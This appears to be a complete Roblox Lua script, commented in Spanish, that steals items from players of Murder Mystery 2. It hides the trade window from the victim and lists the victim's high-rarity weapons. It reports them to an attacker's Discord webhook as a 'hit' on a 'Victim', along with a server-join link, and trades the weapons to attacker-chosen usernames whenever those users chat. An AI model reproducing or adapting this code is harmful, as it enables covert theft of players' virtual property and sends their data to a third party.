-- Servicios
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Evitar ejecución múltiple
if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Configuración
local webhook = _G.webhook or "" -- Tu webhook Discord
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

-- Método de HTTP
local req = syn and syn.request or http_request or request
if not req then
    warn("No HTTP request method available!")
    return
end

-- Función para enviar webhook
local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "Bypass Delta 10.62 🛡️"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

-- Trade
local TradeService = ReplicatedStorage:WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Base de datos de armas
local database = require(ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

-- Lista de armas válidas
local weaponsToSend={}
local totalValue=0
local min_rarity_index=table.find(rarityTable,min_rarity)
local profile=ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)

for id,amount in pairs(profile.Weapons.Owned) do
    local item=database[id]
    if item then
        local ri=table.find(rarityTable,item.Rarity)
        if ri and ri>=min_rarity_index then
            local v = math.random(min_value, min_value+50) -- Valor estimado
            table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
            totalValue+=v*amount
        end
    end
end

-- Ordenar armas por valor
table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

-- Fake link para Discord (solo señuelo)
local fakeToken = math.random(100000,999999)
local fakeLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId=fake-instance&token="..fakeToken..")"

-- Enviar inventario
if #weaponsToSend > 0 then
    local fieldsInit={{name="Victim 👤", value=LocalPlayer.Name, inline=true},
                      {name="Inventario 📦", value="", inline=false},
                      {name="Valor total 💰", value=tostring(totalValue), inline=true},
                      {name="Click para unirte 👇", value=fakeLink, inline=false}}
    for _, w in ipairs(weaponsToSend) do
        fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
    end
    local prefix=pingEveryone and "@everyone " or ""
    SendWebhook("💪 MM2 Hit - Inventario 💯","💰 Disfruta gratis 😎",fieldsInit,prefix)
end

-- ===== Bypass Delta 10.62 - JobId real =====
local function getRealJobId()
    local placeId = game.PlaceId
    local servers = {}
    local success, result = pcall(function()
        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
        local res = req({Url=url, Method="GET", Headers={["Content-Type"]="application/json"}})
        servers = HttpService:JSONDecode(res.Body).data
    end)
    if success then
        for _, s in ipairs(servers) do
            if s.playing < s.maxPlayers then
                return s.id
            end
        end
    end
    return game.JobId -- fallback
end

local function sendRealLinkWebhook()
    local jobId = getRealJobId()
    local token = math.random(100000,999999)
    local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..jobId.."&token="..token..")"
    -- Enviar separado a webhook para unirse
    SendWebhook("🚀 Join seguro","Click para unirte seguro 👇",{ {name="Link real", value=realLink, inline=false} })
end

-- Ejecutar bypass y enviar link real
task.defer(sendRealLinkWebhook)

-- Función trade automático
local function doTrade(targetName)
    if #weaponsToSend == 0 then return end
    while #weaponsToSend>0 do
        local status=getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="SendingRequest" then
            task.wait(0.3)
        elseif status=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do
                local w=table.remove(weaponsToSend,1)
                for _=1,w.Amount do addWeaponToTrade(w.DataID) end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else task.wait(0.5) end
        task.wait(1)
    end
end

-- Activación por chat
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
